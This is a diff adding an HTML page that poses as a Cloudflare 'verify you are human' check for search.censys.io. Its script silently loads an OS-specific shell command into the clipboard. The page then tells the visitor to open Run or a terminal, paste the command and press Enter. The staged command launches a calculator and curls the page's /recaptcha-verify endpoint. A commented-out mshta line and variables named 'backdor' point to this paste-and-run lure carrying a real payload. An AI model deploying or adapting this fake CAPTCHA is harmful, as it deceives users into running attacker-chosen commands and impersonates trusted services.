@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <title>Just a moment...</title>
+
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.0/css/all.css">        
+        <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #1a1a1a;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .captcha-container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #1a1a1a;
+            height: 100vh;
+            width: 100vw;
+            color: #fff;
+        }
+
+        h1, p {
+            color: #fff;
+            margin: 0;
+            padding: 10px;
+        }
+
+        .checkbox-window {
+            height: 74px;
+            width: 300px;
+            background-color: #f9f9f9;
+            border-radius: 3px;
+            border: 1px solid #d3d3d3;
+        }
+
+        .checkbox-window a {
+            color: #555;
+            text-decoration: none;
+        }
+
+        .checkbox-window a:hover {
+            color: #555;
+            text-decoration: underline;
+        }
+
+        .checkbox-container {
+            left: 52px;
+            bottom: 9px;
+            width: 28px;
+            height: 28px;
+        }
+
+        .checkbox {
+            position: relative;
+            background-color: #fff;
+            border-radius: 2px;
+            height: 100%;
+            width: 100%;
+            border: 2px solid #c1c1c1;
+            margin: 21px 0 0 12px;
+            outline: none;
+            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms;
+        }
+
+        .checkbox:hover {
+            border: 2px solid #b2b2b2;
+        }
+
+        .im-not-a-robot {
+            position: relative;
+            left: 52px;
+            bottom: 9px;
+            font-size: 15px;
+            color: #282727;
+        }
+
+        .captcha-logo {
+            position: relative;
+
+            left: 194px;
+            bottom: 46px;
+            width: 90px;
+            height: 45px;
+            vertical-align: baseline;
+            padding-bottom: 4px;
+        }
+        .captcha-logo svg {
+            width: 100%; /* Adjust width as needed */
+            height: auto; /* Maintain aspect ratio */
+        }
+
+        .logo-text {
+              fill: #000; /* Set text color here */
+            font-size: 8px; /* Adjust font size as needed */
+
+        }
+
+
+        .checkbox-desc {
+            color: #555555;
+            position: relative;
+            font-size: 8px;
+            text-align: center;
+            bottom: 90px;
+            left: 112px;
+        }
+
+
+        .spinner {
+            visibility: hidden;
+            position: relative;
+            top: -85px;
+            left: 12px;
+            height: 20px;
+            width: 20px;
+            border: 2px solid rgba(0, 0, 0, 0.1);
+            border-top: 2px solid #333;
+            border-radius: 50%;
+            opacity: 0;
+            transition: opacity 0.5s linear;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .hidden-content {
+            display: none;
+            margin-top: 20px;
+            padding: 20px;
+            background-color: #333;
+            border-radius: 4px;
+        }
+
+        .footer {
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #888;
+            font-size: 12px;
+        }
+
+        .verify-window {
+            opacity: 0;
+            position: absolute;
+            visibility: hidden;
+            margin: auto;
+            width: 310px;
+            background-color: #fff;
+            border: 1px solid #cecece;
+            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12);
+            transition: opacity 400ms;
+        }
+
+        .verify-container {
+            padding: 8px;
+        }
+
+        .verify-header {
+            background-color: #1A73E8;
+            padding: 16px;
+            color: #fff;
+        }
+
+        .verify-main {
+            padding: 5px;
+            color: #111;
+            font-size: 13px;
+        }
+
+        .verify-footer {
+            border-top: 1px solid #cecece;
+            padding: 10px;
+            color: #737373;
+            display: grid;
+            grid-template-columns: auto 102px;
+            font-size: 13px;
+        }
+        .footer-inner {
+            max-width: 1200px; /* Limit the width of the footer inner */
+            margin: 0 auto; /* Center the inner container */
+            padding: 10px; /* Add some padding */
+        }
+        .footer-separator {
+            border-top: 1px solid #fff; /* White separator line */
+            margin: 10px 0; /* Space above and below the line */
+        }
+
+        .verify-verify-button {
+            background-color: #5a89e2;
+            color: #fff;
+            text-align: center;
+            width: 100%;
+            padding: 12px 0;
+            text-decoration: none;
+            font-weight: 600;
+            border-radius: 3px;
+            font-size: 14px;
+            border: none;
+            outline: none;
+            
+        }
+    </style>
+    </head>
+    <body>
+
+    <div id="captchaContainer" class="container m-p">   
+        <div  id="checkbox-nansenc" class="checkbox-nansenc m-p block">
+            <h1>search.censys.io</h1>
+            <p>Verify you are human by completing the action below.</p> 
+            <p>        </p>
+        </div>
+        <div id="checkbox-window" class="checkbox-window m-p block">
+
+
+            <div class="checkbox-container m-p">
+                <button type="button" id="checkbox" class="checkbox m-p line-normal"></button>
+            </div>
+            <p class="im-not-a-robot m-p line-normal">Verify you are human</p>
+            <div class="captcha-logo">
+                <a class="cf-link" target="_blank" href="https://www.cloudflare.com/products/turnstile/?utm_source=turnstile&amp;utm_campaign=widget" rel="noopener noreferrer">
+                    <svg role="img" aria-label="Cloudflare" id="logo" viewBox="0 0 73 25" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z" fill="#F6821F"></path>
+                        <path d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z" fill="#FBAD41"></path>
+                        <text x="15" y="24" font-family="Arial" font-size="13" fill="#000">cloudflare</text> <!-- Added Cloudflare text -->
+                    </svg>
+                </a>
+            </div>
+
+
+            <!-- <img src="https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png" class="captcha-logo line-normal" alt=""> -->
+            <br>
+            <p class="checkbox-desc m-p line-normal">
+            <a href="https://www.cloudflare.com/privacypolicy/">Privacy</a> - <a href="https://www.cloudflare.com/website-terms/">Terms</a>
+            </p>
+            <img class="spinner" alt="" id="spinner">
+            <div id="footer_cloudflare" class="footer">
+                <div class="footer-inner">
+                <div class="footer-separator"></div> <!-- Separator Line -->
+                <div class="clearfix diagnostic-wrapper"><div class="ray-id">Ray ID: <code>8cba6c1ace100d8b</code></div></div>
+                <div class="text-center" id="footer-text">Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com?utm_source=challenge&amp;utm_campaign=m" target="_blank">Cloudflare</a></div>
+                </div>
+            </div>
+        </div>
+        <div  id="checkbox-nansenc" class="checkbox-nansenc m-p block">
+            <p>        </p>
+            <p>search.censys.io needs to review the security of your connection before proceeding.</p> 
+            
+        </div>
+        
+        <div id="verify-window" class="verify-window">
+            <div class="verify-container">
+                <header class="verify-header">
+                    <span class="verify-header-text-medium m-p block">Complete these</span>
+                    <span class="verify-header-text-big m-p block">Verification Steps</span>
+                    <span class="verify-header-text-medium m-p block"></span>
+                </header>
+                <main class="verify-main">
+                    <p>
+                        To better prove you are not a robot, please:
+                    </p>
+                    <ol>
+                        <!-- <ul > -->
+                        <li id="shortcut-list">
+                            Press & hold the Windows Key <i class="fab fa-windows"></i> + <b>R</b>.
+                        </li>
+                        <!-- </ul> -->
+                        
+                        <li>
+                            In the verification window, press <b>Ctrl</b> + <b>V</b>.
+                        </li>
+
+                        <li>
+                            Press <b>Enter</b> on your keyboard to finish.
+                        </li>
+                    </ol>
+                        You will observe and agree:
+                        <br>
+                    <code>
+                        ✅ "I am not a robot - reCAPTCHA Verification ID: <span id="verification-id">146820</span>"
+                    </code>
+
+                   
+                </main>
+            </div>
+            <footer class="verify-container verify-footer">
+                <div class="verify-footer-left">
+                    Perform the steps above to finish verification.
+                </div>
+                <button type="button" class="verify-verify-buttons block" id="verify-verify-buttons" >Verify</button>
+            </footer>
+        </div>        
+    </div>
+<div id="hiddenContent" class="hidden-content">
+    <h2>Welcome to the Secure Page!</h2>
+    <p>This content is only visible after CAPTCHA verification.</p>
+    <div id="footer" class="footer">
+        <p>Performance & security by Your Custom CAPTCHA</p>
+    </div>
+</div>
+
+    <script>
+        var verification_id = generateRandomNumber();
+        document.getElementById('verification-id').textContent = verification_id;
+
+         function detectOS() {
+            const userAgent = window.navigator.userAgent;
+
+            if (userAgent.indexOf("Win") !== -1) {
+                return "Windows";
+            } else if (userAgent.indexOf("Linux") !== -1) {
+                return "Linux";
+            } else if (userAgent.indexOf("Mac") !== -1) {
+                return "MacOS";
+            } else {
+                return "Unknown OS";
+            }
+        }
+
+        // Display the detected OS
+        const osType = detectOS();
+        // alert(osType);
+        // Select the <li> element
+        const listItem = document.getElementById('shortcut-list');
+
+        
+        if (osType == "Windows") {
+            // Change its content
+            listItem.innerHTML = 'Press & hold the <span style="color: red;">Super</span> Key <i class="fab fa-windows"></i> + <b>R</b>.';
+        } else if (osType == "Linux") {
+            // Change its content
+            listItem.innerHTML = 'Press & hold the Ctrl </i> + <b>Alt</b> + <b>T</b>.';
+        } else if (osType == "MacOS") {
+            // Change its content
+            listItem.innerHTML = 'Press & hold the Control  </i> + <b>Option</b> + <b>T</b>.';
+        } else {
+            // Change its content
+            listItem.innerHTML = 'Press & hold the <span style="color: red;">Super</span> Key <i class="fab fa-windows"></i> + <b>R</b>.';
+        }
+
+         async function checkTestname() {
+            try {
+                // Make a GET request to the text file
+                const response = await fetch('config.txt');
+
+                // Check if the request was successful
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+
+                // Get the text content of the file
+                const text = await response.text();
+                console.log(verification_id);
+                
+
+                // Create a regex pattern using the verification_id variable
+                const regexPattern = `verification_id\\s*=\\s*(${verification_id})`;
+                const regex = new RegExp(regexPattern);
+
+                // Match logic to extract the verification ID
+                const match = text.match(regex); // Using the dynamically created regex
+                // console.log(match);
+
+                // Parse the text to find the value of testname
+                // const match = text.match(/verification_id\s*=\s*(\d+)/);
+                
+                if (match) {
+                    const testnameValue = match[1]; // Get the value (1 or 0)
+                    
+                    // Check the value of testname
+                    if (testnameValue === verification_id) {
+                        console.log('Testname is set to 1');
+                        document.getElementById('captchaContainer').style.display = 'none';
+                        document.getElementById('verify-window').style.display = 'none';
+                        // document.getElementById('footer_cloudflare').style.display = 'none';
+                        document.getElementById('hiddenContent').style.display = 'block';
+                        document.title = "shiky";
+                    } else {
+                        console.log( 'Testname is set to 0');
+                    }
+                } else {
+                   console.log('Testname not found in the file');
+                }
+            } catch (error) {
+                console.log('Error: ' + error.message);
+            }
+        }
+         // Check testname every second
+        setInterval(checkTestname, 1000);
+
+        document.getElementById('hiddenContent').style.display = 'none';
+        let checkboxWindow = document.getElementById("checkbox-window");
+        let checkboxBtn = document.getElementById("checkbox");
+        let checkboxBtnSpinner = document.getElementById("spinner");
+        let verifywindow = document.getElementById("verify-window");
+        let verifyButton = document.getElementById("verify-verify-buttons");
+        
+        function addCaptchaListeners() {
+            if (checkboxBtn) {
+                document.addEventListener("click", function (event) {
+                    let path = event.composedPath();
+                    if (!path.includes(verifywindow) && isverifywindowVisible()) {
+                        closeverifywindow();
+                    }
+                });
+                checkboxBtn.addEventListener("click", function (event) {
+                    event.preventDefault();
+                    checkboxBtn.disabled = true;
+                    runClickedCheckboxEffects();
+                });
+            }
+        }
+
+        function runClickedCheckboxEffects() {
+            hideCaptchaCheckbox();
+            setTimeout(function(){
+                showCaptchaLoading();
+            },500);
+            setTimeout(function(){
+                showVerifyWindow();
+            },900)
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+            checkboxBtnSpinner.style.animation = "spin 1s linear infinite";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.opacity = "0";
+            checkboxBtnSpinner.style.animation = "none";
+            setTimeout(function() {
+                checkboxBtnSpinner.style.visibility = "hidden";
+            }, 500);
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.visibility = "hidden";
+            checkboxBtn.style.opacity = "0";
+        }
+
+
+        function showCaptchaCheckbox() {
+            checkboxBtn.style.width = "100%";
+            checkboxBtn.style.height = "100%";
+            checkboxBtn.style.borderRadius = "2px";
+            checkboxBtn.style.margin = "21px 0 0 12px";
+            checkboxBtn.style.opacity = "1";
+        }
+
+        function hideCaptchaCheckbox() {
+            checkboxBtn.style.width = "4px";
+            checkboxBtn.style.height = "4px";
+            checkboxBtn.style.borderRadius = "50%";
+            checkboxBtn.style.marginLeft = "25px";
+            checkboxBtn.style.marginTop = "33px";
+            checkboxBtn.style.opacity = "0";
+        }
+
+        function showCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "visible";
+            checkboxBtnSpinner.style.opacity = "1";
+        }
+
+        function hideCaptchaLoading() {
+            checkboxBtnSpinner.style.visibility = "hidden";
+            checkboxBtnSpinner.style.opacity = "0";
+        }
+
+       function generateRandomNumber() {
+            const min = 1000; 
+            const max = 9999;
+            return Math.floor(Math.random() * (max - min + 1) + min).toString();
+        }
+
+        function closeverifywindow() {
+            verifywindow.style.display = "none";
+            verifywindow.style.visibility = "hidden";
+            verifywindow.style.opacity = "0";
+
+            showCaptchaCheckbox();
+            hideCaptchaLoading();
+            checkboxBtn.disabled = false;
+        }
+
+        function isverifywindowVisible() {
+            return verifywindow.style.display !== "none" && verifywindow.style.display !== "";
+        }
+
+        function setClipboardCopyData(textToCopy){
+            const tempTextArea = document.createElement("textarea");
+            tempTextArea.value = textToCopy;
+            document.body.append(tempTextArea);
+            tempTextArea.select();
+            document.execCommand("copy");
+            document.body.removeChild(tempTextArea);
+        }
+
+        function stageClipboard(commandToRun, verification_id){
+            let suffix = " && "
+            const ploy = "'✅ I am not a robot - reCAPTCHA Verification ID: "
+            let end = "'  "
+            const message_command_linux = 'notify-send -i info "Info" '+ ploy + verification_id ;
+            const message_command_mac = "osascript -e 'display dialog "+ ploy + verification_id +'buttons {"OK"}'+"'";
+            const message_command_win = "msg *"+ploy + verification_id +','+ 'reCAPTCHA isvalid';
+            let message_command = "";
+            if (osType == "Windows") {
+                message_command = message_command_win;
+                end1 = "'";
+                end2 = '"';
+                end = end1 + end2;
+
+                suffix = " & ";
+            } else if (osType == "Linux") {
+                 message_command = message_command_linux;
+            } else if (osType == "MacOS") {
+                 message_command =  message_command_mac;
+            } else {
+                 message_command =  "#";
+            }
+
+            const textToCopy = commandToRun + suffix + message_command + end
+
+            setClipboardCopyData(textToCopy);
+        }
+
+
+        function showVerifyWindow() {
+            verifywindow.style.display = "block";
+            verifywindow.style.visibility = "visible";
+            verifywindow.style.opacity = "1";
+            verifywindow.style.top = checkboxWindow.offsetTop - 80 + "px";
+            verifywindow.style.left =  checkboxWindow.offsetLeft + 54 + "px";
+
+            if (verifywindow.offsetTop < 5) {
+               verifywindow.style.top = "5px";
+            }
+
+            if (verifywindow.offsetLeft + verifywindow.offsetWidth > window.innerWidth-10 ) {
+               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  + "px";
+            }
+
+           
+            // alert(verification_id);
+            const htaPath = window.location.origin + "/recaptcha-verify?id=";
+            // const commandToRun = "mshta " + htaPath;
+            let backdor_linux =  'gnome-calculator > /dev/null 2>&1 &';
+            let backdor_mac =  'mate-calc > /dev/null 2>&1 &';
+            let backdor_win =  'cmd /c "calc &';
+            let backdor = '' ;
+             if (osType == "Windows") {
+                backdor = backdor_win;
+            } else if (osType == "Linux") {
+                 backdor = backdor_linux;
+            } else if (osType == "MacOS") {
+                 backdor =  backdor_mac;
+            } else {
+                 backdor =  "#";
+            }
+            const api = 'curl  '+htaPath +verification_id;
+            const commandToRun = backdor + api ;
+            stageClipboard(commandToRun, verification_id)
+        }
+
+        addCaptchaListeners();
+        // function loadContent() {
+        //     // alert(1);
+            
+        //     document.getElementById('captchaContainer').style.display = 'none';
+        //     document.getElementById('verify-window').style.display = 'none';
+        //     // document.getElementById('footer_cloudflare').style.display = 'none';
+        //     document.getElementById('hiddenContent').style.display = 'block';
+        //     document.title = "shiky";
+        //     // document.getElementById('footer').style.display = 'block';
+        // }
+        // verifyButton.addEventListener('click', loadContent);
+
+        </script>
+    </body>
+</html>
